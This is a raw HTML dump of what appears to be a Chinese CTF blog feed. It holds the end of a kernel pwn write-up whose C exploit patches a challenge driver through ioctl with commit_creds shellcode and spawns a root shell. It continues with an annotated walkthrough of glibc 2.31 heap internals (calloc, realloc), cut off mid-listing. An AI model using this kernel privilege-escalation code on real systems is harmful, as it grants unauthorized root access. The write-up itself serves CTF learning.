class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ull unsigned long long int</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/dev/chardev0&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-type">char</span> shellcode[]=&#123;<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">199</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">195</span>, <span class="hljs-number">32</span>, <span class="hljs-number">24</span>, <span class="hljs-number">10</span>, <span class="hljs-number">129</span>, <span class="hljs-number">255</span>, <span class="hljs-number">211</span>, <span class="hljs-number">72</span>, <span class="hljs-number">137</span>, <span class="hljs-number">199</span>, <span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">195</span>, <span class="hljs-number">48</span>, <span class="hljs-number">20</span>, <span class="hljs-number">10</span>, <span class="hljs-number">129</span>, <span class="hljs-number">255</span>, <span class="hljs-number">211</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>&#125;;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        mov rdi,0</span><br><span class="hljs-comment">        mov rbx,0xffffffff810a1820</span><br><span class="hljs-comment">        call rbx</span><br><span class="hljs-comment">        mov rdi,rax</span><br><span class="hljs-comment">        mov rbx,0xffffffff810a1430</span><br><span class="hljs-comment">        call rbx</span><br><span class="hljs-comment">        pop arg</span><br><span class="hljs-comment">        pop cmd</span><br><span class="hljs-comment">        pop rbp</span><br><span class="hljs-comment">        retn </span><br><span class="hljs-comment">    */</span><br>    ull mod_add=<span class="hljs-number">0xffffffffc0000000</span>;<br>    ull commit_creds=<span class="hljs-number">0xffffffff810a1430</span>;<br>    ull kernel_cred=<span class="hljs-number">0xffffffff810a1820</span>;<br>    ull edit_add=mod_add+<span class="hljs-number">0x33</span>; <span class="hljs-comment">// 这是chardev_ioctl函数的返回部分代码的开头</span><br>    ull a[<span class="hljs-number">2</span>]=&#123;edit_add+<span class="hljs-number">40</span>&#125;;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">40</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i++)&#123;<br>        a[<span class="hljs-number">1</span>]=*(ull*)(&amp;shellcode[n]);<br>        ioctl(fd,<span class="hljs-number">0x80084700</span>,a);<br>        n-=<span class="hljs-number">8</span>;<br>        a[<span class="hljs-number">0</span>]-=<span class="hljs-number">8</span>;<br>    &#125; <span class="hljs-comment">// 修改chardev_ioctl函数中的汇编代码，获取特殊权限</span><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆基础</title>
    <link href="/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/"/>
    <url>/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1>ptmlloc空间布局</h1><h2 id="chunk结构">chunk结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      mchunk_prev_size;<br>  INTERNAL_SIZE_T      mchunk_size; <br>  <span class="hljs-comment">/* mchunk_prev_size 仅在前一个chunk被放入unsorted bin,small bin,large bin中使用</span><br><span class="hljs-comment">      存放前一个chunk的大小</span><br><span class="hljs-comment">     mchunk_size &amp; 1 标识着 前一个chunk是否被放入 unsorted bin,small bin,large bin中</span><br><span class="hljs-comment">     mchunk_size &amp; 2 标识着 当前chunk 是否由mmap分配</span><br><span class="hljs-comment">     mchunk_size &amp; 4 标识着 是否不属于主分配区 */</span><br>  <br>  <span class="hljs-comment">/* 32位程序chunk最小为0x10 ，chunk大小对于0x8进行对齐</span><br><span class="hljs-comment">    64位程序chunk最小为0x20 ，chunk大小对于0x10进行对齐 */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span>         <br>  <span class="hljs-comment">/* 上面四个字段是必须存在的 */</span><br><br>  <span class="hljs-comment">/* 下面两个字段仅在large bin中使用 */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span>  <br>  <span class="hljs-comment">/* fd/bk/fd_nextsize/bk_nextsize 仅在chunk被free之后使用</span><br><span class="hljs-comment">     当chunk正在被使用时，这四个字段用来储存当前chunk的数据 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E5%A0%86%E5%9F%BA%E7%A1%80/pwn-heap.jpg" srcset="/img/loading.gif" lazyload alt="chunk结构" title="chunk结构"></p><pre><code class="hljs">下面以 glibc 2.31 为例分析</code></pre><h2 id="构造">构造</h2><h3 id="libc-calloc">__libc_calloc</h3><pre><code class="hljs">calloc和malloc不同，calloc会初始化chunk的数据段，  所以通过calloc创建的chunk中不会存放unsorted bin的地址</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * __libc_calloc (<span class="hljs-type">size_t</span> n, <span class="hljs-type">size_t</span> elem_size)<br>&#123;<br>  mstate av;<br>  mchunkptr oldtop, p;<br>  INTERNAL_SIZE_T sz, csz, oldtopsize;<br>  <span class="hljs-type">void</span> *mem;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clearsize;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nclears;<br>  INTERNAL_SIZE_T *d;<br>  <span class="hljs-type">ptrdiff_t</span> bytes;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (__builtin_mul_overflow (n, elem_size, &amp;bytes)))<br>    &#123;<span class="hljs-comment">// 先检测用户申请的chunk大小是否合理，并计算chunk size </span><br>       __set_errno (ENOMEM);<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  sz = bytes;<br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      mem = (*hook)(sz, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br>      <span class="hljs-comment">// 当malloc_hook中存在值时替换__libc_calloc函数</span><br>    &#125;<br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//检测并初始化tcache bin</span><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    av = &amp;main_arena;<br>  <span class="hljs-keyword">else</span><br>    arena_get (av, sz);<br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">      当存在多线程时，获取可用分配区</span><br><span class="hljs-comment">      当仅有一个线程时，获取主分配区</span><br><span class="hljs-comment">     */</span><br> <br>  <span class="hljs-keyword">if</span> (av)<br>    &#123;<br>    <span class="hljs-comment">// 检测当前分配区top chunk后是否存在空闲区域，若存在，获取空闲空间的大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>      oldtop = top (av);<br>      oldtopsize = chunksize (top (av));<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> MORECORE_CLEARS &lt; 2</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena &amp;&amp;<br>  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop)<br>oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop);<br>  <br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>&#123;<br>  heap_info *heap = heap_for_ptr (oldtop);<br>  <span class="hljs-keyword">if</span> (oldtopsize &lt; (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop)<br>    oldtopsize = (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      oldtop = <span class="hljs-number">0</span>;<br>      oldtopsize = <span class="hljs-number">0</span>;<br>    &#125;<br>  <span class="hljs-comment">// 先尝试使用_int_malloc获取chunk</span><br>  mem = _int_malloc (av, sz);<br>  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||<br>          av == arena_for_chunk (mem2chunk (mem)));<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">            检测chunk是否合法:</span><br><span class="hljs-comment">            chunk分配失败 mem==NULL</span><br><span class="hljs-comment">            chunk分配成功:</span><br><span class="hljs-comment">              mem 由mmap分配</span><br><span class="hljs-comment">              mem 由heap段分配</span><br><span class="hljs-comment">          */</span><br>  <span class="hljs-keyword">if</span> (!SINGLE_THREAD_P)<br>    &#123;<br>      <span class="hljs-comment">// 当存在多线程时,防止因为多线程导致chunk生成失败</span><br>      <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span> &amp;&amp; av != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <br>  LIBC_PROBE (memory_calloc_retry, <span class="hljs-number">1</span>, sz);<br>  av = arena_get_retry (av, sz);<br>  mem = _int_malloc (av, sz);<br>&#125;<br>      <span class="hljs-keyword">if</span> (av != <span class="hljs-literal">NULL</span>)<br>__libc_lock_unlock (av-&gt;mutex);<br>      <span class="hljs-comment">// 当存在分配区时，重新尝试构造chunk，并释放锁</span><br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  p = mem2chunk (mem);<br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__builtin_expect (perturb_byte, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br>      <span class="hljs-keyword">return</span> mem;<br>      <span class="hljs-comment">// 当chunk由mmap分配时，如果perturb_byte存在，则初始化chunk的数据段</span><br>      <span class="hljs-comment">// 并返回chunk地址</span><br>    &#125;<br><br> <span class="hljs-comment">// 下面的代码是为了初始化chunk的数据段</span><br>  csz = chunksize (p);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>  <span class="hljs-keyword">if</span> (perturb_byte == <span class="hljs-number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))<br>    &#123;<br>      csz = oldtopsize;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  d = (INTERNAL_SIZE_T *) mem;<br>  clearsize = csz - SIZE_SZ;<br>  nclears = clearsize / <span class="hljs-keyword">sizeof</span> (INTERNAL_SIZE_T);<br>  assert (nclears &gt;= <span class="hljs-number">3</span>);<br>  <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (d, <span class="hljs-number">0</span>, clearsize);<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      *(d + <span class="hljs-number">0</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">4</span>)<br>        &#123;<br>          *(d + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;<br>          *(d + <span class="hljs-number">4</span>) = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">6</span>)<br>            &#123;<br>              *(d + <span class="hljs-number">5</span>) = <span class="hljs-number">0</span>;<br>              *(d + <span class="hljs-number">6</span>) = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">8</span>)<br>                &#123;<br>                  *(d + <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;<br>                  *(d + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">return</span> mem;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="realloc">realloc</h3><h4 id="libc-realloc">__libc_realloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__libc_realloc (<span class="hljs-type">void</span> *oldmem, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  INTERNAL_SIZE_T nb;<br>  <span class="hljs-type">void</span> *newp;<br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__realloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <span class="hljs-comment">// 检测当realloc_hook中存有函数地址时，替换realloc</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> REALLOC_ZERO_BYTES_FREES</span><br>  <span class="hljs-keyword">if</span> (bytes == <span class="hljs-number">0</span> &amp;&amp; oldmem != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">// 但重构之后的size为0时，表示直接释放chunk</span><br>      __libc_free (oldmem); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (oldmem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> __libc_malloc (bytes);<br>    <span class="hljs-comment">// 当重构之前的chunk地址为0，则表示需要创建chunk</span><br><br><br>  <span class="hljs-type">const</span> mchunkptr oldp = mem2chunk (oldmem);<br>  <span class="hljs-type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);<br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    ar_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      MAYBE_INIT_TCACHE ();<br>      ar_ptr = arena_for_chunk (oldp);<br>    &#125;<br>  <br>  <span class="hljs-keyword">if</span> ((__builtin_expect ((<span class="hljs-type">uintptr_t</span>) oldp &gt; (<span class="hljs-type">uintptr_t</span>) -oldsize, <span class="hljs-number">0</span>)<br>       || __builtin_expect (misaligned_chunk (oldp), <span class="hljs-number">0</span>))<br>      &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))<br>      malloc_printerr (<span class="hljs-string">&quot;realloc(): invalid pointer&quot;</span>);<br>      <span class="hljs-comment">//检测chunk地址是否合法</span><br><br>  <span class="hljs-keyword">if</span> (!checked_request2size (bytes, &amp;nb))<br>    &#123;<br>      <span class="hljs-comment">// 检测chunk的size是否合法并获取对齐后的size</span><br>      __set_errno (ENOMEM);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    &#123;<span class="hljs-comment">//当chunk由mmap分配时</span><br><br>      <span class="hljs-keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (oldp))<br>&#123; <span class="hljs-comment">//其他储存区域 则新建chunk，不对原有chunk做操作</span><br>  <span class="hljs-type">void</span> *newmem = __libc_malloc (bytes);<br>  <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">if</span> (bytes &gt; oldsize - SIZE_SZ)<br>    bytes = oldsize - SIZE_SZ;<br>  <span class="hljs-built_in">memcpy</span> (newmem, oldmem, bytes);<br>  <span class="hljs-keyword">return</span> newmem;<br>&#125;<br>      <span class="hljs-type">void</span> *newmem;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_MREMAP</span><br>      newp = mremap_chunk (oldp, nb);<br>      <span class="hljs-comment">// 当存在mremap_chunk函数时，调用mremap_chunk函数对chunk进行重构操作</span><br>      <span class="hljs-comment">// mremap_chunk函数其实就是利用系统调用去重构chunk</span><br>      <span class="hljs-keyword">if</span> (newp)<br>        <span class="hljs-keyword">return</span> chunk2mem (newp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)<br>        <span class="hljs-keyword">return</span> oldmem;  <span class="hljs-comment">// 因为时mmap分配的，如果经常进行创建，会影响程序执行效率，所以不缩小mmap分配的chunk</span><br><br>     <span class="hljs-comment">// 如果需要扩充chunk，则先使用malloc创建一个chunk</span><br>     <span class="hljs-comment">// 然后将原chunk的数据，复制到新的chunk中</span><br>     <span class="hljs-comment">// 然后将原chunk释放</span><br>      newmem = __libc_malloc (bytes);<br>      <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="hljs-number">2</span> * SIZE_SZ);<br>      munmap_chunk (oldp); <span class="hljs-comment">//使用mmap的方式释放chunk</span><br>      <span class="hljs-keyword">return</span> newmem;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123; <span class="hljs-comment">// 当仅有一个线程时，直接调用int_realloc重构chunk</span><br>      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);<br>      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||<br>      ar_ptr == arena_for_chunk (mem2chunk (newp)));<br>      <span class="hljs-keyword">return</span> newp;<br>    &#125;<br>     <span class="hljs-comment">// 如果存在多个线程，则先设置线程锁，在重构之后再释放锁</span><br>  __libc_lock_lock (ar_ptr-&gt;mutex);<br>  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);<br>  __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (newp)));<br>          <span class="hljs-comment">// 检测chunk是否合法</span><br><br>  <span class="hljs-keyword">if</span> (newp == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">// 如果chunk重构失败，则尝试创建新的chunk</span><br>      <span class="hljs-comment">// 将原chunk的数据复制到新chunk中之后释放原chunk</span><br>      LIBC_PROBE (memory_realloc_retry, <span class="hljs-number">2</span>, bytes, oldmem);<br>      newp = __libc_malloc (bytes);<br>      <span class="hljs-keyword">if</span> (newp != <span class="hljs-literal">NULL</span>)<br>        &#123;<br><br>          <span class="hljs-built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);<br>          _int_free (ar_ptr, oldp, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">return</span> newp;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="int-realloc">_int_realloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 